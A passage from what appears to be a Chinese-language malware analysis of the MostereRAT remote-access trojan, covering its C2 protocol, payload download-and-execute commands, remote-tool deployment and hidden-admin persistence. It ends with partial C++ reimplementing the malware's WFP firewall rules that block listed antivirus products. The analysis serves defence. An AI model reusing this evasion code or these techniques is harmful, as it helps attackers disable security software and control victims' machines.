+<p><img src="/assets/posts/mostererat/images/1762690185069-6a861d88-99a4-4f39-b657-a2d53c212be6.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h5>禁用 Windows 安全</h5>
+<p>会终止诸如“SecurityHealthService.exe”和“SecurityHealthSystray.exe”之类的进程</p>
+<p><img src="/assets/posts/mostererat/images/1762690527220-f9574754-327b-47aa-ba9b-3267b1b09682.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>停止包括“wuauserv”、“UsoSvc”、“uhssvc”和“WaaSMedicSvc”在内的服务</p>
+<p><img src="/assets/posts/mostererat/images/1762690784995-eac7cc35-dd3b-4d06-a99b-821b1882f42b.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>删除诸如“C:\Windows\System32\WaaSMedicSvc.dll”和“C:\Windows\System32\wuaueng.dll”之类的关键系统文件</p>
+<p><img src="/assets/posts/mostererat/images/1762690820213-4a55b00d-5d35-4f7f-8776-962addb7ba63.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/mostererat/images/1762691108869-77296bff-d6de-4988-b142-90f07d7a461b.png" alt="MostereRAT" loading="lazy" decoding="async">  </p>
+<p>Channel E: <code>channel-8df91be7c24e</code></p>
+<p><img src="/assets/posts/mostererat/images/1762690300804-f127e92b-9194-4f94-92e3-bef9effadc80.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h3 id="elsedll.db">elsedll.db</h3>
+<p>getVersion：</p>
+<p>使用与maindll.db相同的服务器列表与命令与控制服务器通信，通过TCP端口8000建立连接。</p>
+<p>通过相互TLS(mTLS)保护通信，利用嵌入式客户端密钥、客户端证书和CA证书来强制相互身份验证并防止冒充。</p>
+<p><img src="/assets/posts/mostererat/images/1763532176561-312eef70-6ae6-4c89-868e-ff9ab4f68d3d.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>C2数据包以一个幻数1234567890(0x499602D2)开头，后面跟着四个字节，表示数据包长度，然后是一个命令ID，指定要执行的操作。</p>
+<p><img src="/assets/posts/mostererat/images/1763519997295-41f2a1a3-6b98-4c79-9925-700f17dd2d16.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>sub_100275B0</p>
+<p><img src="/assets/posts/mostererat/images/1763520162907-830415f2-b0c4-449e-ae4e-dc5dedd8e75a.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>sub_10027EE0</p>
+<p>支持多种功能，并可以在受害者系统上部署流行的远程访问工具，以实现完全控制，就像正常使用系统一样。</p>
+<p><img src="/assets/posts/mostererat/images/1763520298253-5af9f671-de9f-496c-b529-2d6aee6cf3a4.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h5>case 8100003:发送心跳信号</h5>
+<p><img src="/assets/posts/mostererat/images/1763527535880-03b96925-90f1-44e0-b599-9030c851e0e4.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h5>case 8101701:创建屏幕截图</h5>
+<p><img src="/assets/posts/mostererat/images/1763532735143-f80a2cdb-86d0-4e13-8038-ad3a6d8d50bf.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h5>case 8101614:枚举系统所有用户账户</h5>
+<p><img src="/assets/posts/mostererat/images/1763532011936-892a0dae-851f-4f19-b3ee-250dee1d6d2c.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h5>case 8101611:继续/停止发送关闭监视器的消息</h5>
+<p><img src="/assets/posts/mostererat/images/1763531558613-48e570f1-c03d-439e-8f0e-bf21d28160ca.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h4>数据收集</h4>
+<h5>case 8100005:监控与千牛(阿里巴巴的卖家工具)相关的前台窗口活动，支持提取程序生成的文件数据</h5>
+<p><img src="/assets/posts/mostererat/images/1763522156546-79544ff5-4ab7-4e2b-a15d-48f6c6b58511.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>收集系统信息如:</p>
+<p>计算机名称</p>
+<p><img src="/assets/posts/mostererat/images/1763522277427-28e0e71b-c63a-4adc-a7bb-c6015b270d56.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>Windows操作系统产品详细信息</p>
+<p><img src="/assets/posts/mostererat/images/1763522423355-bbc5b4cb-1c4b-49cf-9b23-4aff9c32c692.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>系统引导时间</p>
+<p><img src="/assets/posts/mostererat/images/1763522457705-9816dd8c-6bc1-4df6-afec-99d52c30b384.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>自上次用户输入以来的时间</p>
+<p><img src="/assets/posts/mostererat/images/1763522510075-f2249945-0de2-4ae0-9fe7-6fe44e1a0741.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>视频捕获驱动程序的数量</p>
+<p><img src="/assets/posts/mostererat/images/1763522578343-50ddc36b-fe71-487e-a45b-38b2f0576fd2.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h4>下载并执行</h4>
+<p>采用多种方法以各种方式下载和执行有效负载，支持shellcode， EPK， DLL和EXE格式。</p>
+<p>下载的数据保存在tmp文件夹中，文件名由GetTickCount64生成。</p>
+<h5>case 8100101:对于EPK有效负载，由EPK Launcher启动</h5>
+<p><img src="/assets/posts/mostererat/images/1763523165886-17844594-61f7-469b-a75c-337a19d75c11.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h5>case 8100103:对于DLL有效负载通常保存到磁盘上，并通过rundll32.exe执行，调用getVersion导出函数。</h5>
+<p><img src="/assets/posts/mostererat/images/1763523318862-91579e40-b6a9-4c52-8f44-0e79892f6d7c.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h5>case 8100104:对于EXE有效负载，可以写入磁盘并作为独立进程运行。</h5>
+<p><img src="/assets/posts/mostererat/images/1763523499215-a851e94c-1036-4b8a-b980-aeea2d4328e6.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h5>case 8100107：ShellCode有效负载被写入分配的内存，然后执行。</h5>
+<p><img src="/assets/posts/mostererat/images/1763524026456-24286277-db15-4ed6-b76b-f82feec3b07e.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h5>case 8100108:</h5>
+<p><img src="/assets/posts/mostererat/images/1763524668316-d659d14c-6c02-4f02-9bcd-0e4ac151f0ec.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h5>case 8100221:</h5>
+<p><img src="/assets/posts/mostererat/images/1763524735868-240129df-054f-4063-8d1e-9029e9f80ea4.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h5>case 8100109:从C2下载并运行EPK文件使用EPK启动器</h5>
+<p><img src="/assets/posts/mostererat/images/1763525297150-1e1f01c3-91d7-43b7-907f-c67328709288.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>.......</p>
+<p><img src="/assets/posts/mostererat/images/1763525318079-5c81672a-e663-461b-a6ec-e9f41ede73a8.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h5>case 8100112:从C2下载并运行DLL文件使用rundll32.exe，并调用getversion函数</h5>
+<p><img src="/assets/posts/mostererat/images/1763525740251-6c7e80a4-8679-4289-81dd-24a1ba216759.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>.......</p>
+<p><img src="/assets/posts/mostererat/images/1763525761195-3e85fad7-fed2-4bef-9211-1ee69dacc397.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h5>case 8100151:下载并将shellcode加载到内存中以供执行。</h5>
+<p><img src="/assets/posts/mostererat/images/1763526191395-9607c06b-b6d2-4363-b5d4-c6d66e0916f5.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>........</p>
+<p><img src="/assets/posts/mostererat/images/1763526212806-2663989a-4814-44c0-bc17-7b06a9010c38.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h4>文件操作</h4>
+<p>仅针对工作目录下/database目录下的文件，并支持读、写、删除操作。</p>
+<h5>case 8100152:读操作</h5>
+<p><img src="/assets/posts/mostererat/images/1763527141102-8cd83ecd-01ac-4b6b-b67d-47789c372759.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h5>case 8100203:删除位于Database目录下的特定文件。</h5>
+<p>文件ID用于标识文件夹中的文件，范围从1001 （0x3E9）到1009 (0x3F1)，对应于文件名01.db到09.db。</p>
+<p><img src="/assets/posts/mostererat/images/1763526824771-9dc1014a-2a45-4584-a0c1-9463c306f88e.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h5>case 8100204:写操作</h5>
+<p><img src="/assets/posts/mostererat/images/1763527284278-15d44e50-c291-419f-bb87-f2bf5d858ce9.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h4>远程接入工具部署</h4>
+<p>使用嵌入在资源中的配置文件运行远程访问和代理工具。在攻击过程中，AnyDesk、Xray和TigerVNC被利用并配置为允许攻击者独占访问。</p>
+<h5>case 8101601:部署Xray和TightVNC</h5>
+<p><img src="/assets/posts/mostererat/images/1763527831982-1238326e-e3d2-4f38-a76a-543227d7ebc7.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>........</p>
+<p><img src="/assets/posts/mostererat/images/1763527860996-0e7b7c87-5d15-4cfc-8221-7d11452fdbc9.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>.......</p>
+<p><img src="/assets/posts/mostererat/images/1763527878049-57fc04a7-347a-4b9a-84e4-10bb5c95e789.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h5>case 8101603:对其他的Xray和TigerVNC进程查杀</h5>
+<p><img src="/assets/posts/mostererat/images/1763528510631-854885bc-012f-4f17-8c68-a9587ffd34db.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h5>case 8101609:安装AnyDesk，根据参数选择不同的安装模式(4种）</h5>
+<p><img src="/assets/posts/mostererat/images/1763530877744-2d5e5d18-a230-4b60-a3ee-ea61f8794a61.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>........</p>
+<p><img src="/assets/posts/mostererat/images/1763530911910-5caac11c-36ed-4908-94d5-8c8b8080478f.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>.......</p>
+<p><img src="/assets/posts/mostererat/images/1763531025476-56e5e1fc-b4be-4502-b747-023bb6dc95d6.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h5>case 8101610:对其他的AnyDesk进程查杀</h5>
+<p><img src="/assets/posts/mostererat/images/1763533045521-63fb6f63-a90a-45e9-9baa-1258bbfec2d8.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>此外，支持第三方RDP工具‘ RDP Wrapper ’和配置更改，允许快速修改RDP设置-例如通过注册表编辑启用或禁用多个会话登录。</p>
+<h5>case 8101604:启用和配置Windows远程桌面服务</h5>
+<p>启用RDP核心服务，注入RDP包装器DLL</p>
+<p><img src="/assets/posts/mostererat/images/1763528697749-aee92d4e-7708-4bf9-82c5-ec39686dec67.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>修改登录策略</p>
+<p><img src="/assets/posts/mostererat/images/1763528898553-01cb78c5-432b-4942-90ea-a4f72e283441.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>禁用RDP安全限制</p>
+<p><img src="/assets/posts/mostererat/images/1763528761657-ab977954-f901-4c4b-851d-1b5c88ffe81a.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>配置会话限制、启用多用户并发</p>
+<p><img src="/assets/posts/mostererat/images/1763528787556-47497eea-eca9-4153-b19a-04e4c74e6cec.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>启用重定向功能</p>
+<p><img src="/assets/posts/mostererat/images/1763528818284-c525bfd9-6328-41a7-b539-7c917772c9a0.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p>修改认证策略、启用RDP连接</p>
+<p><img src="/assets/posts/mostererat/images/1763528834221-6b2ca51f-4886-4377-b3c4-72aa712b5c4e.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h5>case 8101605:快速配置RDP的登录和安全设置</h5>
+<p><img src="/assets/posts/mostererat/images/1763529532438-ede86cd0-ba4f-4988-a6aa-6061d8b0f6c3.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h5>case 8101607:启用RDP多会话登录</h5>
+<p><img src="/assets/posts/mostererat/images/1763530670807-75ff8e40-1ffb-4694-a867-d898b020514b.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h5>case 8101608:禁用RDP多会话登录</h5>
+<p><img src="/assets/posts/mostererat/images/1763530752571-12fafa51-b433-4d32-a0bc-fdc9a1f40c38.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h4>通过隐藏帐户持久化</h4>
+<h5>case 8101606:</h5>
+<p>创建新用户的命令可以通过修改注册表路径</p>
+<p>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList</p>
+<p>创建以用户名命名的REG_DWORD条目并将其值设置为0，将密码未过期的帐户添加到administrators组中，并将其隐藏在Windows登录UI中。</p>
+<p>在代码实现中，条目名称被硬编码为‘V’，而不是使用实际的用户名。</p>
+<p><img src="/assets/posts/mostererat/images/1763530318097-3212355e-6134-498e-933d-f6418bcf6a24.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/mostererat/images/1763530372049-fd9d98fa-ea18-46bc-ac3e-b5269e3ef2fc.png" alt="MostereRAT" loading="lazy" decoding="async"></p>
+<h5></h5>
+<h3 id="流量阻断实现">流量阻断实现</h3>
+<pre><code class="hljs language-cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tlhelp32.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;shlwapi.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;set&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;filesystem&gt;</span> </span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fwpmu.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;rpc.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;aclapi.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sddl.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;memory&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;psapi.h&gt;</span> </span>
+
+<span class="hljs-keyword">namespace</span> fs = std::filesystem;
+
+<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">"fwpuclnt.lib"</span>)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">"rpcrt4.lib"</span>)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">"advapi32.lib"</span>)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">"shlwapi.lib"</span>)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">"Psapi.lib"</span>)</span>
+
+<span class="hljs-type">const</span> std::vector&lt;std::wstring&gt; securityProcessNames = {
+    <span class="hljs-string">L"360Safe.exe"</span>,  <span class="hljs-string">L"360sd.exe"</span>,  <span class="hljs-string">L"antivirus.exe"</span>,  <span class="hljs-string">L"QQPCMgr.exe"</span>,
+    <span class="hljs-string">L"Sysdiag.exe"</span>,  <span class="hljs-string">L"msmpeng.exe"</span>,  <span class="hljs-string">L"MsMpEng.exe"</span>, <span class="hljs-string">L"NisSrv.exe"</span>, <span class="hljs-string">L"Defender.exe"</span>,  <span class="hljs-string">L"Kaspersky.exe"</span>,  <span class="hljs-string">L"ESET Security.exe"</span>,
+    <span class="hljs-string">L"Security.exe"</span>,  <span class="hljs-string">L"Avira.exe"</span>,  <span class="hljs-string">L"Avast.exe"</span>,  <span class="hljs-string">L"Malwarebytes.exe"</span>,
+    <span class="hljs-string">L"Antivirus.exe"</span>,  <span class="hljs-string">L"Bitdefender.exe"</span>,  <span class="hljs-string">L"Norton.exe"</span>,  <span class="hljs-string">L"Symantec.exe"</span>,
+    <span class="hljs-string">L"McAfee.exe"</span>,  <span class="hljs-string">L"2345PCSafe.exe"</span>,  <span class="hljs-string">L"PCManager.exe"</span>,  <span class="hljs-string">L"Rising.exe"</span>,
+    <span class="hljs-string">L"Microsoft PC Manager.exe"</span>
+};
+
+<span class="hljs-type">const</span> std::vector&lt;std::wstring&gt; securitySoftwarePaths = {
+    <span class="hljs-string">L"C:/Program Files/360/360Safe"</span>, <span class="hljs-string">L"C:/Program Files/360/360sd"</span>,
+    <span class="hljs-string">L"C:/Program Files/360/360zip"</span>, <span class="hljs-string">L"C:/Program Files (x86)/360/360Safe"</span>,
+    <span class="hljs-string">L"C:/Program Files (x86)/360/360sd"</span>, <span class="hljs-string">L"C:/Program Files (x86)/360/360zip"</span>,
+    <span class="hljs-string">L"C:/ProgramData/360safe"</span>, <span class="hljs-string">L"C:/ProgramData/360SD"</span>,
+    <span class="hljs-string">L"C:/Program Files/kingsoft/kingsoft antivirus"</span>, <span class="hljs-string">L"C:/Program Files (x86)/kingsoft/kingsoft antivirus"</span>,
+    <span class="hljs-string">L"C:/ProgramData/kdata"</span>, <span class="hljs-string">L"C:/ProgramData/kdesk"</span>,
+    <span class="hljs-string">L"C:/ProgramData/Kingsoft"</span>, <span class="hljs-string">L"C:/ProgramData/KRSHistory"</span>,
+    <span class="hljs-string">L"C:/Program Files/Tencent/QQPCMgr"</span>, <span class="hljs-string">L"C:/Program Files (x86)/Tencent/QQPCMgr"</span>,
+    <span class="hljs-string">L"C:/ProgramData/Tencent/QQPCMgr"</span>, <span class="hljs-string">L"C:/Program Files/Huorong/Sysdiag"</span>,
+    <span class="hljs-string">L"C:/Program Files (x86)/Huorong/Sysdiag"</span>, <span class="hljs-string">L"C:/ProgramData/Huorong/Sysdiag"</span>,
+    <span class="hljs-string">L"C:/Program Files/Windows Defender"</span>, <span class="hljs-string">L"C:/Program Files (x86)/Windows Defender"</span>,
+    <span class="hljs-string">L"C:/ProgramData/Microsoft/Windows Defender"</span>, <span class="hljs-string">L"C:/Program Files/Common Files/AV"</span>,
+    <span class="hljs-string">L"C:/Program Files/ESET"</span>, <span class="hljs-string">L"C:/ProgramData/ESET"</span>,
+    <span class="hljs-string">L"C:/Program Files/Avira"</span>, <span class="hljs-string">L"C:/Program Files (x86)/Avira"</span>,
+    <span class="hljs-string">L"C:/ProgramData/Avira"</span>, <span class="hljs-string">L"C:/Program Files/Avast Software"</span>,
+    <span class="hljs-string">L"C:/ProgramData/Avast Software"</span>, <span class="hljs-string">L"C:/Program Files/Malwarebytes"</span>,
+    <span class="hljs-string">L"C:/ProgramData/Malwarebytes"</span>, <span class="hljs-string">L"C:/Program Files/AVG"</span>,
+    <span class="hljs-string">L"C:/Program Files/Common Files/AVG"</span>, <span class="hljs-string">L"C:/ProgramData/AVG"</span>,
+    <span class="hljs-string">L"C:/Program Files (x86)/2345Soft/2345PCSafe"</span>, <span class="hljs-string">L"C:/Program Files (x86)/Lenovo/PCManager"</span>,
+    <span class="hljs-string">L"C:/Program Files (x86)/Rising"</span>, <span class="hljs-string">L"C:/Program Files/Microsoft PC Manager"</span>
+};
+
+<span class="hljs-keyword">struct</span> <span class="hljs-title class_">FwpmMemoryDeleter</span> {
+    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(<span class="hljs-type">void</span>* p)</span> <span class="hljs-type">const</span> </span>{
+        <span class="hljs-keyword">if</span> (p) <span class="hljs-built_in">FwpmFreeMemory0</span>(&amp;p);
+    }
+};
+<span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;
+<span class="hljs-keyword">using</span> FwpmMemPtr = std::unique_ptr&lt;T, FwpmMemoryDeleter&gt;;
+
+<span class="hljs-type">const</span> GUID PROVIDER_KEY = { <span class="hljs-number">0xdd8e57b0</span>, <span class="hljs-number">0xb264</span>, <span class="hljs-number">0x4245</span>, {<span class="hljs-number">0xa6</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x8a</span>} };
+<span class="hljs-type">const</span> GUID SUBLAYER_KEY = { <span class="hljs-number">0xa552636a</span>, <span class="hljs-number">0x39a7</span>, <span class="hljs-number">0x488b</span>, {<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x35</span>} };
+<span class="hljs-type">const</span> std::vector&lt;GUID&gt; WFP_LAYERS_TO_BLOCK = {
+    FWPM_LAYER_ALE_AUTH_CONNECT_V4,
+    FWPM_LAYER_ALE_AUTH_CONNECT_V6,
+    FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V4,
+    FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V6
+};
+
+HANDLE g_engineHandle = <span class="hljs-literal">nullptr</span>;
+<span class="hljs-type">bool</span> g_providerAndSublayerInitialized = <span class="hljs-literal">false</span>;
+std::set&lt;std::wstring&gt; g_blockedExecutables;
+
+<span class="hljs-function">std::wstring <span class="hljs-title">GetProcessPath</span><span class="hljs-params">(DWORD processId)</span> </span>{
+    HANDLE hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
+    <span class="hljs-keyword">if</span> (!hProcess) <span class="hljs-keyword">return</span> <span class="hljs-string">L""</span>;
+
+    <span class="hljs-type">wchar_t</span> path[MAX_PATH] = { <span class="hljs-number">0</span> };
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">GetModuleFileNameExW</span>(hProcess, <span class="hljs-literal">nullptr</span>, path, MAX_PATH)) {
+        <span class="hljs-built_in">CloseHandle</span>(hProcess);
+        <span class="hljs-keyword">return</span> path;
+    }
+
+    <span class="hljs-built_in">CloseHandle</span>(hProcess);
+    <span class="hljs-keyword">return</span> <span class="hljs-string">L""</span>;
+}
+
+<span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">InitializeProviderAndSublayer</span><span class="hljs-params">()</span> </span>{
+    DWORD result = <span class="hljs-built_in">FwpmTransactionBegin0</span>(g_engineHandle, <span class="hljs-number">0</span>);
+    <span class="hljs-keyword">if</span> (result != ERROR_SUCCESS) {
+        std::wcerr &lt;&lt; <span class="hljs-string">L"FwpmTransactionBegin0 failed. Error: "</span> &lt;&lt; result &lt;&lt; std::endl;
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+    }
+
+    FWPM_PROVIDER0 provider = { <span class="hljs-number">0</span> };
+    provider.providerKey = PROVIDER_KEY;
+    provider.displayData.name = <span class="hljs-built_in">const_cast</span>&lt;<span class="hljs-type">wchar_t</span>*&gt;(<span class="hljs-string">L"Security Blocker Provider"</span>);
+    result = <span class="hljs-built_in">FwpmProviderAdd0</span>(g_engineHandle, &amp;provider, <span class="hljs-literal">nullptr</span>);
+    <span class="hljs-keyword">if</span> (result != ERROR_SUCCESS &amp;&amp; result != FWP_E_ALREADY_EXISTS) {
+        std::wcerr &lt;&lt; <span class="hljs-string">L"FwpmProviderAdd0 failed. Error: "</span> &lt;&lt; result &lt;&lt; std::endl;
+        <span class="hljs-built_in">FwpmTransactionAbort0</span>(g_engineHandle);
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+    }
+
+    FWPM_SUBLAYER0 subLayer = { <span class="hljs-number">0</span> };
+    subLayer.subLayerKey = SUBLAYER_KEY;
+    subLayer.displayData.name = <span class="hljs-built_in">const_cast</span>&lt;<span class="hljs-type">wchar_t</span>*&gt;(<span class="hljs-string">L"Security Blocker Sublayer"</span>);
+    subLayer.providerKey = <span class="hljs-built_in">const_cast</span>&lt;GUID*&gt;(&amp;PROVIDER_KEY);
+    subLayer.weight = <span class="hljs-number">0xFFFF</span>;
+    result = <span class="hljs-built_in">FwpmSubLayerAdd0</span>(g_engineHandle, &amp;subLayer, <span class="hljs-literal">nullptr</span>);
+    <span class="hljs-keyword">if</span> (result != ERROR_SUCCESS &amp;&amp; result != FWP_E_ALREADY_EXISTS) {
+        std::wcerr &lt;&lt; <span class="hljs-string">L"FwpmSubLayerAdd0 failed. Error: "</span> &lt;&lt; result &lt;&lt; std::endl;
+        <span class="hljs-built_in">FwpmTransactionAbort0</span>(g_engineHandle);
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+    }
+
+    result = <span class="hljs-built_in">FwpmTransactionCommit0</span>(g_engineHandle);
+    <span class="hljs-keyword">if</span> (result != ERROR_SUCCESS) {
+        std::wcerr &lt;&lt; <span class="hljs-string">L"FwpmTransactionCommit0 failed. Error: "</span> &lt;&lt; result &lt;&lt; std::endl;
+        <span class="hljs-built_in">FwpmTransactionAbort0</span>(g_engineHandle);
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+    }
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+}
+
+<span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">AddApplicationFirewallBlockRules</span><span class="hljs-params">(<span class="hljs-type">const</span> std::wstring&amp; applicationPath)</span> </span>{
+    <span class="hljs-keyword">if</span> (g_blockedExecutables.<span class="hljs-built_in">count</span>(applicationPath)) {
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+    }
+
+    <span class="hljs-keyword">if</span> (g_engineHandle == <span class="hljs-literal">nullptr</span>) {
+        FWPM_SESSION0 session = { <span class="hljs-number">0</span> };
+        session.txnWaitTimeoutInMSec = INFINITE;
+        DWORD result = <span class="hljs-built_in">FwpmEngineOpen0</span>(<span class="hljs-literal">nullptr</span>, RPC_C_AUTHN_WINNT, <span class="hljs-literal">nullptr</span>, &amp;session, &amp;g_engineHandle);
+        <span class="hljs-keyword">if</span> (result != ERROR_SUCCESS) {
+            std::wcerr &lt;&lt; <span class="hljs-string">L"FwpmEngineOpen0 failed. Error: "</span> &lt;&lt; result &lt;&lt; std::endl;
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+        }
+    }
+
+    <span class="hljs-keyword">if</span> (!g_providerAndSublayerInitialized) {
+        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">InitializeProviderAndSublayer</span>()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+        g_providerAndSublayerInitialized = <span class="hljs-literal">true</span>;
+    }
+
+    FWP_BYTE_BLOB* appBlob = <span class="hljs-literal">nullptr</span>;
+    DWORD result = <span class="hljs-built_in">FwpmGetAppIdFromFileName0</span>(applicationPath.<span class="hljs-built_in">c_str</span>(), &amp;appBlob);
+    <span class="hljs-keyword">if</span> (result != ERROR_SUCCESS) {
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+    }
+    <span class="hljs-function">FwpmMemPtr&lt;FWP_BYTE_BLOB&gt; <span class="hljs-title">appId</span><span class="hljs-params">(appBlob)</span></span>;
+
+    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; layerKey : WFP_LAYERS_TO_BLOCK) {
+        FWPM_FILTER0 filter = { <span class="hljs-number">0</span> };
+        <span class="hljs-built_in">UuidCreate</span>(&amp;filter.filterKey);
+
+        filter.displayData.name = <span class="hljs-built_in">const_cast</span>&lt;<span class="hljs-type">wchar_t</span>*&gt;(<span class="hljs-string">L"Security Software Block Rule"</span>);
+        filter.layerKey = layerKey;
+        filter.subLayerKey = SUBLAYER_KEY;
+        filter.providerKey = <span class="hljs-built_in">const_cast</span>&lt;GUID*&gt;(&amp;PROVIDER_KEY);
+        filter.weight.type = FWP_EMPTY;
+        filter.action.type = FWP_ACTION_BLOCK;
+
+        FWPM_FILTER_CONDITION0 condition = { <span class="hljs-number">0</span> };
+        condition.fieldKey = FWPM_CONDITION_ALE_APP_ID;
+        condition.matchType = FWP_MATCH_EQUAL;
+        condition.conditionValue.type = FWP_BYTE_BLOB_TYPE;
+        condition.conditionValue.byteBlob = appId.<span class="hljs-built_in">get</span>();
+
+        filter.numFilterConditions = <span class="hljs-number">1</span>;
+        filter.filterCondition = &amp;condition;
+
+        UINT64 filterId = <span class="hljs-number">0</span>;
+        result = <span class="hljs-built_in">FwpmFilterAdd0</span>(g_engineHandle, &amp;filter, <span class="hljs-literal">nullptr</span>, &amp;filterId);
+        <span class="hljs-keyword">if</span> (result != ERROR_SUCCESS) {
